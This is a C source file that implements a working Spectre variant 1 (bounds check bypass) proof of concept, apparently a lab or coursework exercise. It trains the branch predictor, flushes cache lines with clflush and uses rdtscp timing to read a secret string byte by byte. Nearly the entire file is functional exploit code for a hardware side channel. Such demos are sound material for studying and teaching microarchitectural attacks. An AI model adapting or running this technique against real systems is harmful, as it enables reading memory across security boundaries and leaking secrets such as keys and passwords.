#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include "shuffle_map.h"
#include "largest_2.h"

typedef int bool;
#define TRUE  1
#define FALSE 0

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

#define THRESHOLD 100
#define NUM_TIMING 1000 // the number of times a timing attack get performed
#define FILL_BHR 30 // the iterations needed in a for loop to create a uniformed branch history register
#define NUM_CALL 20 // totel number of calls to the victim function before the timing attack
#define INTERVAL 5 // the intervel with which attack is performed, we train for the rest of the time
bool is_attack[NUM_CALL] = {0};



char *secret = "The Magic Words are Squeamish Ossifrage.";

// used to prevent the compiler from optimizing out victim_function()
uint8_t temp = 0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}


/**
 * Spectre Attack Function to Read Specific Byte.
 *
 * @param malicious_x The malicious x used to call the victim_function
 *
 * @param values      The two most likely guesses returned by your attack
 *
 * @param scores      The score (larger is better) of the two most likely guesses
 */
void attack(size_t malicious_x, uint8_t value[2], int score[2]) {

 
  unsigned int junk = 0;
  uint64_t t0;
  uint64_t delta;
  volatile uint8_t tmp;
  int hits[256] = {0};
  int train_x, curr_x;


  for(int try = 0; try < NUM_TIMING; try++){

    for (volatile int j=0; j < 100; j++);
    _mm_mfence();

    // flush array 2 from cache
    for (int k = 0; k < 256; k++)
    {
      _mm_clflush(&array2[k * 512]);
    }
    
    // so that the cache hit resulting from training are distributed among the valid indexes
    train_x = try % array1_size; 

    for (size_t i = 0; i < NUM_CALL; i++)
    {
        //flush the cache for array1_size
        _mm_clflush(&array1_size);
        // fill BHR (Branch History Register)
        for (volatile int j = 0; j < FILL_BHR; ++j){}
        // run victim_function(can be either train or attack depending on the entry of is_attack array)
        curr_x = is_attack[i] * malicious_x + (1-is_attack[i]) * train_x;
        victim_function(curr_x);
    }

    // cache timing attack
    for (int k=0; k<256; k++){
      int idx = forward[k];
      t0 = __rdtscp(&junk);
      tmp = array2[idx * 512];
      delta = __rdtscp(&junk) - t0;
      if (delta < THRESHOLD){
        hits[idx]++;
      }
    }



  }

largest_two(hits, value, score, 256);


}

int main(int argc, const char **argv) {
  printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
  size_t malicious_x = (size_t)(secret - (char *)array1); /* read the secret */
  int score[2], len = strlen(secret);
  uint8_t value[2];

  // initialize array2 to make sure it is in its own physical page and
  // not in a copy-on-write zero page
  for (size_t i = 0; i < sizeof(array2); i++)
    array2[i] = 1; 


  // initiate attack array, an array of flag regarding whether to attack or not
  for (size_t i = 0; i < NUM_CALL; i+= INTERVAL)
  {
    is_attack[i] = TRUE;
  }
  
  // attack each byte of the secret, successively
  printf("Reading %d bytes:\n", len);

  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    attack(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    printf("\n");
  }
  return (0);
}

